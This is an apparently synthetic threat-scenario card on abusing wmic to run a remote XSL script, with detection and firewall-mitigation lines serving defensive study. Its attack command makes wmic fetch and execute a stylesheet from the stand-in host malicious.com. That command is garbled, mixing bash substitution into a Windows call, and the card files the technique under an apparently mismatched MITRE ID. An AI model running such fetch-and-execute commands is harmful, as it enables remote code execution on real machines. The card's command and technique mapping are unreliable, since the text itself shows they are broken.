---
type: campaign
scenario_id: 83
tactic: Execution
technique: "T1059.003: Windows Command Shell"
technique_id: T1059.003
tags: [campaign, lotl, execution]
---

# Using wmic to execute XSL script for code execution.

## Threat Description
Using wmic to execute XSL script for code execution.

## Attack Command
```
wmic process call create "wmic os get /format:http://malicious.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).xsl"
```

## Detection Logic
Monitor wmic XSL: `wmic process where name='wmic.exe' get commandline | findstr xsl`; Event ID 4688.

## Mitigation
Block wmic network access: `netsh advfirewall firewall add rule name='Block WMIC' dir=out program='%windir%\System32\wbem\wmic.exe' action=block`; Disable XSL execution: AppLocker.

## AI Training Prompt
Train AI to detect wmic XSL execution and suggest firewall rules.

## References
- MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
